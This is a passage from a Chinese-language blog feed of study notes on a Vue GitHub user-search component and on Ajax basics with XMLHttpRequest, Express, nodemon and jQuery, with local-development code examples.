class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">      //input框</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; placeholder=&quot;enter the name you search&quot; v-model=&quot;keyWord&quot;/&gt;&amp;nbsp;&lt;button              @click=&quot;searchUsers&quot;&gt;Search&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"> //vue部分</span><br><span class="line"> data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        keyWord:&#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">    searchUsers()&#123;</span><br><span class="line">        axios.get(`https://api.github.com/search/users?q=$&#123;this.keyWord&#125;`).then(//模板字符串实现字符串的插值功能</span><br><span class="line">            response=&gt;&#123;</span><br><span class="line">                console.log(&#x27;请求成功了&#x27;,response.data.items)//得到一堆用户</span><br><span class="line">                this.$bus.$emit(&#x27;getUsers&#x27;,response.data.items)//全局事件总线移交数据</span><br><span class="line">            &#125;,</span><br><span class="line">            error =&gt;&#123;</span><br><span class="line">                console.log(&#x27;请求失败了&#x27;,error.message)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="然后是List显示部分："><a href="#然后是List显示部分：" class="headerlink" title="然后是List显示部分："></a>然后是List显示部分：</h3><p>在List部分，我们首先需要的是一个v-for循环以产生多个用户框。</p><p>然后是使用全局事件总线接收Search传过来的数据，并在v-for中显示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//template部分</span><br><span class="line">&lt;!-- v-for实现遍历 --&gt;</span><br><span class="line">      &lt;div class=&quot;card&quot; v-for=&quot;user in users&quot; :key=&quot;user.login&quot;&gt;</span><br><span class="line">          &lt;!--用户地址 --&gt;</span><br><span class="line">        &lt;a :href=&quot;user.html_url&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">          &lt;img :src=&quot;user.avatar_url&quot; style=&#x27;width: 100px&#x27;/&gt;</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">        &lt;p class=&quot;card-text&quot;&gt;&#123;&#123;user.login&#125;&#125;&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"> //vue部分</span><br><span class="line"> data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        users:[</span><br><span class="line">            &#123;&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">mounted() &#123;</span><br><span class="line">    this.$bus.$on(&#x27;getUsers&#x27;,(users)=&gt;&#123;</span><br><span class="line">        // console.log(users);</span><br><span class="line">        this.users = users//收到数据，存在自身</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="样例拓展："><a href="#样例拓展：" class="headerlink" title="样例拓展："></a>样例拓展：</h3><p>如果我们需要加入一些过渡效果，比如显示 欢迎词 和 加载中，我们应该怎么做呢？</p><p>思路：<br>首先想到的肯定是通过 v-show 来控制显示或者隐藏，但是这个导致的结果就是=&gt;我们需要增加很多元素来帮助我们控制这些标签的显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isFirst: true,</span><br><span class="line">isLoading: false,</span><br><span class="line">errMsg: &quot;&quot;,</span><br><span class="line">users: [],</span><br></pre></td></tr></table></figure><p>而且这些变量的改变是在另外一个标签<code>Search</code>中，那么我们的全局事件总线就会变得非常的冗杂。</p><p>于是我们决定改造我们在全局事件总线中传递的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//将冗杂的数据封装成一个数组</span><br><span class="line">data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      dataObj: &#123;</span><br><span class="line">        isFirst: true,</span><br><span class="line">        isLoading: false,</span><br><span class="line">        errMsg: &quot;&quot;,</span><br><span class="line">        users: [],</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">//Search中传递对象</span><br><span class="line">this.$bus.$emit(&#x27;updateList&#x27;,&#123;isFirst:false,isLoading:true,errMsg:&#x27;&#x27;,users:[]&#125;)</span><br><span class="line"></span><br><span class="line">//List中接收对象并使用es6语法比较替换</span><br><span class="line">mounted() &#123;</span><br><span class="line">    this.$bus.$on(&quot;updateList&quot;, (dataObj) =&gt; &#123;</span><br><span class="line">      // console.log(users);</span><br><span class="line">      this.dataObj = &#123;...this.dataObj,...dataObj&#125;//es6语法&#123;...x&#125;重名的以后面为主</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>这样便实现了我们事件总线的优化，避免事件总线的变量变得太过冗杂，使得变量的语义化更加明显。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Ajax</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ajax</title>
    <link href="/2022/04/30/Ajax/"/>
    <url>/2022/04/30/Ajax/</url>
    
    <content type="html"><![CDATA[<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="1-Ajax简介"><a href="#1-Ajax简介" class="headerlink" title="1.Ajax简介"></a>1.Ajax简介</h2><p>Ajax实现的是我们网页在不刷新时，发送http请求，也就是<strong>有用则加载，不用就不加载</strong></p><p>它的优点是：1.不刷新实现请求，2.更新部分页面内容</p><p>​        缺点是：1.没有浏览历史，不能回退，2.有跨域问题，3.对于SEO（搜索引擎优化）不友好，比如爬虫</p><p>而它在传输数据时，使用的语言，之前是XML（一种类似HTML但是没有预定义标签的传输和储存方式），进化到现在使用的便是JSON</p><h2 id="2-http报文"><a href="#2-http报文" class="headerlink" title="2.http报文"></a>2.http报文</h2><p>http协议是网络层上的协议，实现客户机服务器数据交互而存在，它有两种类型的报文：</p><h3 id="（1）-请求报文"><a href="#（1）-请求报文" class="headerlink" title="（1）.请求报文"></a>（1）.请求报文</h3><p><img src="https://s2.loli.net/2022/05/03/WQxFRuGhKTngSvp.png" alt="http请求报文.png"></p><p>注意的是：报文头的格式，空行用于分割报文头和报文体，报文体在POST下是不为空的，在GET下是为空的（POST和GET都是请求方式）</p><h3 id="（2）-响应报文"><a href="#（2）-响应报文" class="headerlink" title="（2）.响应报文"></a>（2）.响应报文</h3><p><img src="https://s2.loli.net/2022/05/03/4aLxr5AUydKk8bi.png" alt="http响应报文.png"></p><p>响应报文同样需要注意 报文头部，空行和报文体，这里的报文体返回的是服务器的数据，例如我们的html代码</p><h3 id="（3）-NetWork"><a href="#（3）-NetWork" class="headerlink" title="（3）.NetWork"></a>（3）.NetWork</h3><p>我们在浏览器控制台中会有一个NetWork选项：（这里的请求报文是GET类型，所以没有报文体）</p><p><img src="https://s2.loli.net/2022/05/03/jXSI68hposJFv7V.png" alt="network选项.png"></p><p>进入一个网页点开便是我们发送的所有请求（如果没有就刷新一下），在左侧的Name栏点击第一个文件，Header下的Request Header就是我们请求报文的报文头，Response Header便是我们响应报文的报文头。</p><p>那么报文体在哪里呢？报文体在我们的Response选项中，得到的就是我们响应报文的报文体。如果我们发送的是POST请求报文，那它的报文体就在：</p><p><img src="https://s2.loli.net/2022/05/03/AePl9E8Z6XGz74J.png" alt="POST报文的报文体.png"></p><p>Header下的From Data属性中。</p><h2 id="3-express框架"><a href="#3-express框架" class="headerlink" title="3.express框架"></a>3.express框架</h2><h3 id="（1）-安装express"><a href="#（1）-安装express" class="headerlink" title="（1）.安装express"></a>（1）.安装express</h3><p>express框架是基于node.js 的，所以我们在安装express之前需要先安装node.js。安装完后，我们新建一个文件</p><p>在控制台输入<code>npm i express</code>这样我们就可以安装express。</p><p>接下来我们写第一个ajax代码：（代码大致分为四个部分）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//1.引入express</span><br><span class="line">const &#123; response &#125; = require(&#x27;express&#x27;);</span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line"></span><br><span class="line">//2.创建应用对象</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">//3.创建路由规则,request是对请求报文的封装，response是对响应报文的封装</span><br><span class="line">app.get(&#x27;/&#x27;, (request, response) =&gt; &#123;</span><br><span class="line">    //设置响应</span><br><span class="line">    response.send(&#x27;hello express&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//4.监听端口</span><br><span class="line">app.listen(8000,()=&gt;&#123;</span><br><span class="line">    console.log(&quot;服务已经启动，8000端口监听&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接下来我们在控制台输入<code>node 文件名</code>就可以在8000端口看到我们的页面了。</p><h3 id="（2）-模拟服务器"><a href="#（2）-模拟服务器" class="headerlink" title="（2）.模拟服务器"></a>（2）.模拟服务器</h3><p>实现模拟我们需要两个代码，一个是我们的前端代码，一个是我们的服务器代码。</p><p>我们先看才学习的服务器代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//1.引入express</span><br><span class="line">const &#123; response &#125; = require(&#x27;express&#x27;);</span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line"></span><br><span class="line">//2.创建应用对象</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">//server是路径</span><br><span class="line">app.get(&#x27;/server&#x27;, (request, response) =&gt; &#123;</span><br><span class="line">    //设置响应头，设置允许跨域</span><br><span class="line">    response.setHeader(&#x27;Access-Control-Allow-Orgin&#x27;,&#x27;*&#x27;);</span><br><span class="line">    //设置响应</span><br><span class="line">    response.send(&#x27;hello AJAX&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//4.监听端口</span><br><span class="line">app.listen(8000,()=&gt;&#123;</span><br><span class="line">    console.log(&quot;服务已经启动，8000端口监听&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>和之前的变化不大，改变了一个<code>/server</code>,是路径名，也就是这个服务器在8000的<code>./sever</code>下 =》 <code>http://localhost:8000/server</code></p><p>然后是前端代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;AJAX GET 请求&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        #result &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 100px;</span><br><span class="line">            border: solid 1px #90b;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button&gt;点击发送请求&lt;/button&gt;</span><br><span class="line">    &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const btn = document.querySelector(&quot;button&quot;);</span><br><span class="line">        btn.onclick = function () &#123;//点击事件</span><br><span class="line">            //1.创建对象</span><br><span class="line">            const xhr = new XMLHttpRequest();</span><br><span class="line">            //2.初始化请求方式和url</span><br><span class="line">            xhr.open(&#x27;GET&#x27;, &#x27;http://localhost:8000/server&#x27;);</span><br><span class="line">            //3.发送</span><br><span class="line">            xhr.send();</span><br><span class="line">            //4.事件绑定</span><br><span class="line">            xhr.onreadystatechange = function () &#123;</span><br><span class="line">                if (xhr.readyState === 4) &#123;//说明返回来所有结果   </span><br><span class="line">                    if (xhr.Status &gt;= 200 &amp;&amp; xhr.Status &lt; 300) &#123;//状态码正常</span><br><span class="line">                        console.log(xhr.statusText);</span><br><span class="line">                        console.log(xhr.getAllResponseHeaders());</span><br><span class="line">                        console.log(xhr.response);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是script部分的四个步骤，主要是事件绑定中的两个判断，是对于响应报文的两个判断，在一切正常之后我们就可以得到响应报文的各个部分。</p><h3 id="（3）-设置url参数"><a href="#（3）-设置url参数" class="headerlink" title="（3）.设置url参数"></a>（3）.设置url参数</h3><p>在URL中的参数，我们通过?和&amp;设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(&#x27;GET&#x27;, &#x27;http://localhost:8000/server?a=100&amp;b=200&amp;c=300&#x27;);</span><br></pre></td></tr></table></figure><p>这里便是配置了a,b,c三个参数，参数与地址之间用问号做分割，参数与参数之间用&amp;做分割。</p><p>我们的参数设置成功之后就可以在<code>Network</code>中的<code>Payload</code>中参看</p><h3 id="（4）-发送post请求"><a href="#（4）-发送post请求" class="headerlink" title="（4）.发送post请求"></a>（4）.发送post请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">result.addEventListener(&quot;mouseover&quot;, function () &#123;</span><br><span class="line">            //1.创建对象</span><br><span class="line">            const xhr = new XMLHttpRequest();</span><br><span class="line">            //2.初始化请求方式和url</span><br><span class="line">            xhr.open(&#x27;POST&#x27;, &#x27;http://localhost:8000/server&#x27;);</span><br><span class="line">            //3.发送</span><br><span class="line">            xhr.send();</span><br><span class="line">            //4.事件绑定</span><br><span class="line">            xhr.onreadystatechange = function () &#123;</span><br><span class="line">                if (xhr.readyState === 4) &#123;//说明返回来所有结果   </span><br><span class="line">                    if (xhr.Status &gt;= 200 &amp;&amp; xhr.Status &lt; 300) &#123;//状态码正常</span><br><span class="line">                        //获取response</span><br><span class="line">                        result.innerHTML = xhr.response;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>对于post请求，我们需要将 .open 选项的第一个参数改为 POST，表示这个是post类型的报文。</p><p>因为我们post可以发送<strong>请求体</strong>，所以我们可以在send()中加入参数<strong>send(a:100)或者send(a=100)或者JSON格式</strong></p><p>然后在服务器端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//post请求</span><br><span class="line">app.post(&#x27;/server&#x27;, (request, response) =&gt; &#123;</span><br><span class="line">    //设置响应头，设置允许跨域</span><br><span class="line">    response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;,&#x27;*&#x27;);</span><br><span class="line">    //设置响应</span><br><span class="line">    response.send(&#x27;hello AJAX post&#x27;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>增加这个代码，设置对于post请求的返回。</p><h3 id="（5）-设置请求头"><a href="#（5）-设置请求头" class="headerlink" title="（5） .设置请求头"></a>（5） .设置请求头</h3><p>我们可以使用<code>setRequestHeader</code>设置请求头。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//设置请求头</span><br><span class="line">xhr.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);</span><br><span class="line">//自定义请求头</span><br><span class="line">xhr.setRequestHeader(&#x27;name&#x27;,&#x27;ajax&#x27;);</span><br></pre></td></tr></table></figure><p>但是对于自定义请求头，服务器端需要申明接收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.all(&#x27;/server&#x27;, (request, response) =&gt; &#123;</span><br><span class="line">    //设置响应头，设置允许跨域</span><br><span class="line">    response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;,&#x27;*&#x27;);</span><br><span class="line">    //接收自定义请求头</span><br><span class="line">    response.setHeader(&#x27;Access-Control-Allow-Headers&#x27;,&#x27;*&#x27;);</span><br><span class="line">    //设置响应</span><br><span class="line">    response.send(&#x27;hello AJAX&#x27;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>1.需要改变接收类型为all，表示接收所有类型的请求头</p><p>2.需要在setHeader中添加接收同意<code>response.setHeader(&#39;Access-Control-Allow-Headers&#39;,&#39;*&#39;);</code></p><p>这样我们的自定义请求头也不会报错了！</p><h3 id="（6）-JSON-转换"><a href="#（6）-JSON-转换" class="headerlink" title="（6）.JSON 转换"></a>（6）.JSON 转换</h3><p>在服务端发送数据的时候，<code>response.send()</code>中的数据必须是字符串类型的数据，所以在我们传输数据的时候就需要调动JSON。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.all(&#x27;/JSON-server&#x27;, (request, response) =&gt; &#123;</span><br><span class="line">    let data=&#123;</span><br><span class="line">        name:&#x27;swpu&#x27;</span><br><span class="line">    &#125;;</span><br><span class="line">    //将要送的对象转换为字符串</span><br><span class="line">    let str= JSON.stringify(data);</span><br><span class="line">    //设置响应头，设置允许跨域</span><br><span class="line">    response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;,&#x27;*&#x27;);</span><br><span class="line">    //send只能送字符串</span><br><span class="line">    response.send(str);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>而在接收方，我们就需要解析response的数据，这里就有两种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//方案一：手动转换</span><br><span class="line">if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) &#123;</span><br><span class="line">     //使用手动转换</span><br><span class="line">        let data = JSON.parse(xhr.response)</span><br><span class="line">        console.log(data);//手动的时候里面填data</span><br><span class="line">        result.innerHTML=data.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//方案二：自动转换</span><br><span class="line">//设置自动转换类型-json，将response的json解析</span><br><span class="line">xhr.responseType=&quot;json&quot;</span><br><span class="line">...</span><br><span class="line">if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) &#123;</span><br><span class="line">console.log(xhr.response);//这里的response已经解析过</span><br><span class="line">result.innerHTML=xhr.response.name;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="（7）-nodemon"><a href="#（7）-nodemon" class="headerlink" title="（7）.nodemon"></a>（7）.nodemon</h3><p><code>nodemon</code> 是一个基于node 的小工具，它可以帮助我们实现<strong>不重启实行服务端的刷新</strong> ，首先确保安装了node.js</p><p>然后我们在控制台输入：<code>npm install -g nodemon</code></p><p>在我们需要运行服务端的时候输入：<code>nodemon 文件名</code></p><p>tips：我运行时报了一个错：</p><p><img src="https://s2.loli.net/2022/05/03/czu13ligoVNLURv.png" alt="nodemon报错.png"></p><p>遇到这个问题时，我们打开window的powershell，以管理员身份运行</p><p><img src="https://s2.loli.net/2022/05/03/auoGSPJXMkTF1bx.png" alt="nodemon问题解决1.png"></p><p>输入：<code>set-ExecutionPolicy RemoteSigned</code>，再重新运行一下我们的nodemon就可以了</p><h3 id="（8）-断网和超时响应"><a href="#（8）-断网和超时响应" class="headerlink" title="（8）.断网和超时响应"></a>（8）.断网和超时响应</h3><p>在我们网络不好或者没有网的时候需要得到页面的反馈，而这些就是ajax中的超时反馈</p><p>我们通过setTimeout模拟网络延迟：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.all(&#x27;/delay&#x27;, (request, response) =&gt; &#123;</span><br><span class="line">    //设置响应头，设置允许跨域</span><br><span class="line">    response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;,&#x27;*&#x27;);</span><br><span class="line">    //设置响应</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        response.send(&#x27;hello AJAX&#x27;);</span><br><span class="line">    &#125;, 3000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>设置三秒的延迟</p><p>在前端页面上，我们要求在两秒以上便不再等待，直接报错提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xhr.timeout=2000;</span><br><span class="line">xhr.ontimeout=function()&#123;</span><br><span class="line">alert(&quot;网络异常，链接失败&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ontimeout会在timeout的时间之后，<strong>执行函数回调，并取消这个请求</strong></p><p>我们接下来模拟断网，在network选项下选择offline</p><p>前端页面中加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr.onerror=function()&#123;</span><br><span class="line">alert(&quot;网络已断开&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在断网条件下，发出警示。</p><h3 id="（9）-取消发送请求"><a href="#（9）-取消发送请求" class="headerlink" title="（9）.取消发送请求"></a>（9）.取消发送请求</h3><p>在我们需要使用<code>ajax</code>手动取消请求发送的时候，我们可以使用<code>ajax</code>对象上的abort()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btn2.onclick = function()&#123;</span><br><span class="line">            xhr.abort();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是：<strong>要把xhr的定义放在外层，而且需要定义成let</strong> ，不然会因为变量域的问题报错。</p><h3 id="（10）-重复发送问题"><a href="#（10）-重复发送问题" class="headerlink" title="（10）.重复发送问题"></a>（10）.重复发送问题</h3><p>在遇到一个用户多次或者多个用户同时发送超多请求的情况下。我们需要一种机制使得我们的服务端压力减少。</p><p>这里采用的是标志变量的解决办法，比较暴力：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const btn1 = document.querySelector(&quot;#btn1&quot;);</span><br><span class="line">        //标志变量</span><br><span class="line">        let isSending=false;</span><br><span class="line">        let xhr=null;</span><br><span class="line">        btn1.onclick = function () &#123;</span><br><span class="line">            if(isSending) xhr.abort();//如果现在有请求，那么取消当前请求，发送一个新的请求</span><br><span class="line">            xhr = new XMLHttpRequest();</span><br><span class="line">            isSending=true;//表示此刻已有请求</span><br><span class="line">            xhr.open(&#x27;GET&#x27;, &#x27;http://localhost:8000/delay&#x27;);</span><br><span class="line">            xhr.send();</span><br><span class="line">            xhr.onreadystatechange = function () &#123;</span><br><span class="line">                if (xhr.readyState === 4) &#123;//说明返回来所有结果   </span><br><span class="line">                    isSending=false;//返回结果请求结束，重新改为false</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>每次发送请求之前都判断当前是否有请求发送但未回复，如果有就取消那个请求，并发送一个新的请求。</p><h2 id="4-jQuery中的Ajax"><a href="#4-jQuery中的Ajax" class="headerlink" title="4.jQuery中的Ajax"></a>4.jQuery中的Ajax</h2><p>jQuery中通过Ajax发送请求的方式有三种，GET，POST和通用方法Ajax</p><h3 id="方式1-get"><a href="#方式1-get" class="headerlink" title="方式1  $.get()"></a>方式1  $.get()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;button&#x27;).eq(0).click(function()&#123;</span><br><span class="line">            $.get(&#x27;http://localhost:8000/jQuery-server&#x27;,&#123;a:100&#125;,function(data)&#123;</span><br><span class="line">                console.log(data);</span><br><span class="line">            &#125;,&#x27;json&#x27;)//末尾可以传入参数，表示传输的数据类型</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>和我们一般的get请求差异不大，只是写成了偏函数的形式。get中的参数(url，传参，回调，response解析格式)</p><h3 id="方式2-post"><a href="#方式2-post" class="headerlink" title="方式2  $.post()"></a>方式2  $.post()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;button&#x27;).eq(1).click(function()&#123;</span><br><span class="line">            